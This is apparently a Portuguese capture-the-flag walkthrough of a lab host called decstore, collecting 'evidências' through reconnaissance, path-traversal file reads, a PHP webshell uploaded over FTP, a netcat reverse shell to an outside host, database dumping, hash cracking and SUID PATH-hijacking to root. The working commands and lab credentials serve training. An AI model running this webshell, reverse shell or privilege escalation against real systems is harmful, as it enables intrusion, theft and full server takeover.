
## Reconhecimento e Varredura
----
- Iniciei realizando  uma scanner de servicos/portas expostas  com o `nmap` e encontrei as portas `80,8080,53,2121,22552.

```css
	nmap -v -sS --open -p- -Pn 172.23.1.45
```

- ![[nmap.png]]

- Digitando o **ip:**`172.23.1.45` no navegador não retornava nada, mas  adicionando o **ip** na lista de host em `/etc/hosts` conseguimos reposta do host.

- ![[2025-12-15_11-35.png]]

- Agora com comunicação com o host e sabendo as portas open, vamos focar em na enumeração de subdomain, pois identificamos inicialmente que a porta `53-tcp`  exporta.
- Para isso usaremos a ferramenta `gobuster` para busca de subdomínios.
```css
gobuster dns --domain decstore.dsc -w    /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --ne

```
- ![[gobuster-subdominios-decstore.png]]
 `✔️ **Motivo real: Gobuster faz brute-force direto no DNS**`
- O **Gobuster DNS** funciona exatamente assim:
- Ele pega cada palavra da wordlist
- Adiciona ao domínio.
> [!NOTE] Exemplo
  `loja.decstore.dsc`
  `api.decstore.dsc`
  `dev.decstore.dsc`

- Faz uma **consulta DNS A/AAAA/CNAME** diretamente no servidor DNS configurado no sistema.    
- Se o DNS responder, ele **reporta como subdomínio existente**.   
- 🔥 Ou seja: **Gobuster** descobre subdomínios mesmo quando não existe registro público ou não existe fonte externa que mencione o subdomínio.  
- Ele depende apenas do DNS responder.
---
- Nesse processo descobrimos um subdomínio que e `homologacao.decstore.dsc`  e consuntivelmente iremos adiciona-lo no no arquivo `/etc/hosts`.
---
## Brute-Force de Diretórios
---
- Realizando um  brute-force  no domínio `www.decstore.dsc/`  com a ferramenta `dirb` e `Feroxbuster.`

```css
dirb http://www.decstore.dsc/ -w /usr/share/wordlist/dirb/big.txt -X .php
```

- ![[dirb-brute-force.png]] 

```css
feroxbuster -u http://www.decstore.dsc/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -s 200 -x php 
```
 - ![[feroxbuster.png]]

- Verificando os arquivos, encontramos o arquivos `download.php` e abrindo esse link : http://www.decstore.dsc/download.php no navegador, observa-se que e baixado esse arquivo.
- ![[parametro-download.png]]

- Abrindo o arquivo `download.php`  vemos o seu código fonte.
- ![[codigo-arq-download.png]]
- **O que o código faz**
	-  Recebe um parâmetro via GET
	- `$file = $_GET['file'];`
	- Ele pega o que o usuário colocar em:
	- `download.php?file=algum_arquivo.ext`
	
- Resultando em um problema de segurança: LFI / Path Traversal.
- Sabendo disso, vamos baixar os arquivos encontrados no brute-force de diretórios/arquivos.
- Baixando o `INDEX.PHP` e analisando seu conteúdo/código observamos que ele tem a rota:`CONTROLE/CONSULTA.PHP`que nos permite baixar o arquivo: `consulta.php` passando essa nova rota no navegador:
- ![[arq-fluxo-index.png]]
> [!NOTE] Exemplo
>  http://www.decstore.dsc/download.php?file=controle/consulta.php

E abrindo o novo arquivo baixado (`consulta.php`) encontramos outra roda que nos permite baixar o arquivo (`conecta.php`).
- ![[arq-fluxo-consulta.png]]
- Por fim, baixando o arquivo (`config.php`) e abrindo-o  , obteremos as credencias do banco de dados do servidor que e por conseguinte `evidencia 5`.
- ![[arq-fluxo-conecta.png]]![[evidencia-05.png]]
## Exploração 
---
- Realizei novamente um scan com o `nmap` nas portas `2121` e `22552` para identificar versões dos serviços em execução e possíveis vulnerabilidades associadas a eles.
```css
	nmap -v -sC -sV -p 2121,22552 -Pn 172.23.1.45
```
- ![[servicos-exportos-nmap.png]]
- Com as credencias usuário: `deckstore` e senha: `#us3RX987X321#` encontradas no arquivo config, podemos conectar no servidor, usando o serviço de `FTP` rodando na porta `2121`.
```css
	ftp 172.23.1.45 2121
```

- Dentro do servidor via ft, iremos `fazer um upload de uma webshell` no diretório `/var/site1/arquivos` .
```php
	?php
      system($_GET['cmd']);
	?>
```

```css
	put shell3.php
```

- ![[upload-shell-via-ftp.png]]
- Dando as permissões ao arquivo `shell3.php` para ser executado pelo servidor.
- Obtendo um reverse shell através da `webshell`, para isso, jogando navegador o caminho:

```css
http://www.decstore.dsc/var/site1/arquivos/shell3.php?cmd=busybox nc 172.23.10.96 4444 -e sh
```

- ![[shell-reverse-servidor.png]]

- Com o acesso ao servidor via web shell que nos permite executar comandos remotamente com o `nc` para um receber reverse shell na nossa maquina, a partir dessa reverse shell  iremos usar as informações do arquivo `conf.php` obtido anteriormente para acessar o banco de dados local (`mysql`) no servidor.
```css
	mysql -u decstore -p
```

- Ira pedir a senha(`#us3RX987X321#`).
- Rodando o comando no MySQL
```css
	use deckstore;
	show tables;
	SELECT *FROM CHAVES;
```  
- retornando todas as tabelas do banco de dados de `deckstore` e nessa tabela encontramos a `evidencia-01`.

- ![[evidencia-01-key.png]]
- Ainda no MySQL acessando a base de dados `deckstore_old` encontraremos a `evidencia-02`.
```css
	show databases;
	use deckstore_old;
	show tables;
	select *from usuarios;
```

- ![[evidencia-02-key-decstore.png]]
- Buscando  por mais credencias encontraremos um hash e quebrando essa hash usando o `john` obteremos a `evidencia-03`
- ![[evidencia-03-hash-key.png]]
- No brute-force de diretório e arquivos  encontramos uma  area de login.
- ![[admin-login-decstore.png]]
- Usando o usuário (`decstore`) e senha (`princess`) obtido da hash quebrada, podemos logar no sistema e encontrando a `evidencia-04` na aba `promocao`
- ![[evidencia-04-logado-painel.png]]![[evidencia-04-aba-promocoes.png]]![[evidencia-04-key.png]]

- Dentro servidor em `/var/www/site2/arquivos` encontraremos a `evidencia-06`.
- ![[evidencia-06-key.png]]
- Com acesso  via `ftp` ao servidor ou via `reverse shell` através da web shell  obteremos  a `evidencia-07` na raiz do servidor.
- ![[evidencia07-key.png]]
- **Resumo do PrivEsc — PATH Hijacking com binário SUID**
- Rodando o script `linpeas.sh ` encontraremos o binário `/script/backup`  que é **SUID root** e roda como root.
- Dentro dele há um `system("cat /var/log/backup.txt")` **sem caminho absoluto**.    
- Isso permite **PATH Hijacking** (o sistema procura `cat` no `$PATH`).    
- Criar diretório para colocar um `cat` falso:
```css
 mkdir /tmp/fakebin
 cd /tmp/fakebin

```
- Criar arquivo `cat` malicioso com o `nano` e dar permissão de execução:
- ```css
	  #!/bin/sh 
	  /bin/bash -p
  ```
- Alterar PATH para priorizar o fake `cat`:
- ```css
	  export PATH=/tmp/fakebin:$PATH
  ```
-  Executar o binário vulnerável:
- ```css
	  /script/backup
  ```
- ![[evidencia-08-priviesc.png]]
- Como permissão de `root` podemos acessar o diretório `/root` na raiz do servidor e obter a `evidencia-08`.
![[evidencia-08-key.png]]